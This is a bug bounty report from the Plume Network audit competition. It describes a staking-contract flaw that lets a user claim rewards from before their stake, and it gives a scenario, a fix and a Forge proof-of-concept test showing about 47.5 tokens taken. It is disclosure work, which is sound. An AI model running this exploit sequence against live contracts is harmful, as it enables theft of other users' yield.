# 49616 sc high user can steal rewards

**Submitted on Jul 17th 2025 at 18:55:47 UTC by @shadowHunter for** [**Attackathon | Plume Network**](https://immunefi.com/audit-competition/plume-network-attackathon)

* **Report ID:** #49616
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/attackathon-plume-network/blob/main/plume/src/facets/StakingFacet.sol>
* **Impacts:**
  * Theft of unclaimed yield

## Description

### Brief / Intro

It appears that on a fresh stake, `$.userValidatorRewardPerTokenPaidTimestamp` is only updated for active reward tokens and not for historical (previously removed) reward tokens. This creates a window where a user can receive unauthorized rewards.

{% hint style="danger" %}
Impact: User can steal rewards (theft of unclaimed yield).
{% endhint %}

## Vulnerability Details

{% stepper %}
{% step %}

### Scenario step

Reward token `PUSD` existed and is removed at timestamp X.
{% endstep %}

{% step %}

### Scenario step

Post removal, User A stakes `10e18` tokens.
{% endstep %}

{% step %}

### Scenario step

User A immediately unstakes `10e18` tokens. User A has `0` staked tokens.
{% endstep %}

{% step %}

### Scenario step

Later, `PUSD` is added again at timestamp X+1.
{% endstep %}

{% step %}

### Scenario step

User B stakes while `PUSD` is active.
{% endstep %}

{% step %}

### Scenario step

At X+500 seconds User B stakes again and `PUSD` is removed.
{% endstep %}

{% step %}

### Scenario step

User A stakes a very large amount at X+500 seconds. Since `PUSD` is not an active token, its `userValidatorRewardPerTokenPaidTimestamp` remains X (the old timestamp).
{% endstep %}

{% step %}

### Scenario step

User A immediately claims and receives rewards for the full 500 seconds (from X to X+500) even though they shouldn't be entitled to them.
{% endstep %}
{% endstepper %}

## Impact Details

User can steal rewards.

## Recommendation

Update `_initializeRewardStateForNewStake` to iterate all historical reward tokens instead of just `$.rewardTokens` to ensure state is updated properly for all reward tokens (including ones that were previously removed).

## Proof of Concept

<details>

<summary>PoC test (forge) and failing assertion</summary>

Command used:

```
forge test --via-ir --match-path "test/PlumeStakingDiamond.t.sol" --match-test testPOC_6 --optimizer-runs 200 --no-auto-detect --optimize -vvv
```

Test code:

```solidity
function testPOC_6() public {
    
        uint256 time= block.timestamp;
        uint256 blok= block.number;

        // Ensure treasury has enough PUSD by transferring tokens
        uint256 treasuryAmount = 100 ether;
        vm.startPrank(admin); // admin already has tokens from constructor
        pUSD.transfer(address(treasury), treasuryAmount);
        vm.stopPrank();
        
        console2.log("PUSD Token removed at timestamp ", time);
        

        vm.startPrank(admin);
        RewardsFacet(address(diamondProxy)).removeRewardToken(address(pUSD));
        vm.stopPrank();
        
        console2.log("User 1 stakes at timestamp ", time);
        
        vm.startPrank(user1);
        // Stake
        uint256 stakeAmount = 10 ether;
        StakingFacet(address(diamondProxy)).stake{ value: stakeAmount }(DEFAULT_VALIDATOR_ID);
        
        
        uint256 balanceAfter = pUSD.balanceOf(user1);
    
        
        console2.log("User 1 unstakes at timestamp ", time);
        vm.startPrank(user1);
        StakingFacet(address(diamondProxy)).unstake(DEFAULT_VALIDATOR_ID, stakeAmount);
        vm.stopPrank();
        
        PlumeStakingStorage.StakeInfo memory userInfo = StakingFacet(address(diamondProxy)).stakeInfo(user1);
        assertEq(userInfo.staked, 0, "First staker's amount should be correctly recorded");
        
        console2.log("Round 1");
        console2.log("Initial Timestamp", block.timestamp);
        vm.roll(blok + 1);
        vm.warp(time + 1);
        console2.log("Increased Timestamp", block.timestamp);
        
        console2.log("Reward token added at timestamp ", time);
        vm.prank(admin);
        RewardsFacet(address(diamondProxy)).addRewardToken(address(pUSD), 1e16, 1e18);
        
        console2.log("User 2 stakes stakes at timestamp ", time);
        vm.startPrank(user2);
        StakingFacet(address(diamondProxy)).stake{ value: stakeAmount }(DEFAULT_VALIDATOR_ID);
        vm.stopPrank();
        
        console2.log("Round 2");
        console2.log("Initial Timestamp", block.timestamp);
        vm.roll(blok + 500);
        vm.warp(time + 500);
        console2.log("Increased Timestamp", block.timestamp);

        console2.log("User 2 stakes again at timestamp ", time);
        vm.startPrank(user2);
        StakingFacet(address(diamondProxy)).stake{ value: stakeAmount }(DEFAULT_VALIDATOR_ID);
        vm.stopPrank();
        
        console2.log("Reward token removed at timestamp ", time);
        vm.startPrank(admin);
        RewardsFacet(address(diamondProxy)).removeRewardToken(address(pUSD));
        vm.stopPrank();
        
        console2.log("User 1 stakes fresh at timestamp ", time);
        vm.startPrank(user1);
        StakingFacet(address(diamondProxy)).stake{ value: stakeAmount }(DEFAULT_VALIDATOR_ID);
        
        
        console2.log("User1 claim all at timestamp ", time);
        vm.startPrank(user1);
        RewardsFacet(address(diamondProxy)).claim(address(pUSD), DEFAULT_VALIDATOR_ID);
        uint256 balanceAfterX = pUSD.balanceOf(user1);
        console2.log("balanceAfterX", balanceAfterX-balanceAfter);
        vm.stopPrank();
        console2.log("User1 claim all done");
        assertEq(balanceAfterX-balanceAfter,0);
        
    }
```

Test output (failing assertion):

```
Encountered 1 failing test in test/PlumeStakingDiamond.t.sol:PlumeStakingDiamondTest
[FAIL: assertion failed: 47500000000000000000 != 0] testPOC_6() (gas: 1867932)
```

</details>
